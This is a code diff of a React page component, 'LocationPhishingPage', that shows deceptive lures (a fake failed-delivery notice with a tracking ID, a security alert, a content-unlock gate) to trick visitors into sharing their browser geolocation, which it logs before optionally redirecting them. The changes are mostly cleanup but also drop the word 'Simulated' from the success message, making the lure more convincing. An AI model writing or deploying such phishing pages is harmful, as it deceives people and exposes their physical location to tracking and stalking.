@@ -7,16 +7,15 @@ import type { LocationData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card'; 
+import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
 import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck } from 'lucide-react';
-import Image from 'next/image';
 
 interface TemplateContent {
   title: string;
   actionText: string;
-  message: string; 
+  message: string;
   heroIcon?: LucideIcon;
-  pageSpecificMessage?: string; 
+  pageSpecificMessage?: string;
   imageSrc?: string;
 }
 
@@ -54,8 +53,8 @@ const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';
 
 export default function LocationPhishingPage() {
   const { addLog } = useLogs();
-  const params = useParams();
-  const templateId = typeof params.id === 'string' ? params.id : 'default';
+  const { id: idFromParams } = useParams<{ id: string }>();
+  const templateId = idFromParams || 'default';
   const content = templateContent[templateId] || templateContent.default;
 
   const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
@@ -81,12 +80,12 @@ export default function LocationPhishingPage() {
           setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
           setTimeout(() => {
             window.location.href = redirectUrl;
-          }, 2500); 
+          }, 2500);
         } else {
           setStatusMessage("Location verified. Thank you. This window can now be closed.");
         }
       } else {
-        setStatusMessage(undefined); 
+        setStatusMessage(undefined); // No top banner message for other templates
       }
     } else {
       setStatusMessage(undefined);
@@ -112,7 +111,7 @@ export default function LocationPhishingPage() {
           longitude: position.coords.longitude,
           accuracy: position.coords.accuracy,
         };
-        
+
         addLog({ type: 'location', data: locationData });
         setStatus('captured');
         setIsLoading(false);
@@ -157,13 +156,13 @@ export default function LocationPhishingPage() {
                 <div className="grid grid-cols-[auto_1fr] gap-x-4 gap-y-2 text-sm sm:text-md">
                   <span className="font-medium text-muted-foreground">Tracking ID:</span>
                   <span className="text-foreground font-mono bg-muted/50 px-2 py-0.5 rounded-sm">#TZ78391B</span>
-                  
+
                   <span className="font-medium text-muted-foreground">Status:</span>
                   <span className="font-semibold text-destructive flex items-center">
                     <AlertTriangle className="w-4 h-4 mr-1.5 flex-shrink-0" />
                     Delivery Attempt Failed
                   </span>
-                  
+
                   <span className="font-medium text-muted-foreground">Last Update:</span>
                   <span className="text-foreground">{currentTime || 'Fetching time...'}</span>
                 </div>
@@ -178,11 +177,11 @@ export default function LocationPhishingPage() {
       case 'security-alert':
         return (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
-            <div className="flex items-start mb-3"> 
-              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground flex-shrink-0 mt-1" /> 
+            <div className="flex items-start mb-3">
+              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground flex-shrink-0 mt-1" />
               <div>
-                <AlertTitle className="text-2xl font-bold text-destructive-foreground mb-1">{content.title}</AlertTitle> 
-                <AlertDescription className="text-md text-destructive-foreground/90 leading-relaxed"> 
+                <AlertTitle className="text-2xl font-bold text-destructive-foreground mb-1">{content.title}</AlertTitle>
+                <AlertDescription className="text-md text-destructive-foreground/90 leading-relaxed">
                   {content.pageSpecificMessage || content.message}
                 </AlertDescription>
               </div>
@@ -194,7 +193,7 @@ export default function LocationPhishingPage() {
           <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
             <CardContent className="space-y-4">
               <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
-              <ShadcnCardDescription className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardDescription>
+              <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
             </CardContent>
           </ShadcnCard>
@@ -210,8 +209,8 @@ export default function LocationPhishingPage() {
   };
 
   return (
-    <PhishingPageLayout 
-        title={templateId === 'package-delivery-issue' ? '' : content.title} 
+    <PhishingPageLayout
+        title={templateId === 'package-delivery-issue' || templateId === 'security-alert' ? '' : content.title}
         isLoading={isLoading && status !== 'captured'}
         error={error}
         statusMessage={statusMessage}
@@ -220,11 +219,11 @@ export default function LocationPhishingPage() {
         {renderTemplateSpecificContent()}
 
         {status !== 'captured' && (
-          <Button 
-            onClick={handleLocationRequest} 
+          <Button
+            onClick={handleLocationRequest}
             size="lg"
             className={`w-full text-lg py-6 shadow-md ${
-              templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground' 
+              templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground'
               : 'bg-accent hover:bg-accent/90 text-accent-foreground'
             }`}
             disabled={isLoading || status === 'requesting'}
@@ -240,7 +239,7 @@ export default function LocationPhishingPage() {
             <p className="text-xl font-semibold text-green-700">
               {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                 ? "Location verified. Thank you. Now you'll be redirected to the wanted website."
-                : "Location Verified (Simulated)"}
+                : "Location Verified"}
             </p>
             <p className="text-md text-green-600">
               {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
@@ -260,7 +259,3 @@ export default function LocationPhishingPage() {
     </PhishingPageLayout>
   );
 }
-    
-
-    
-
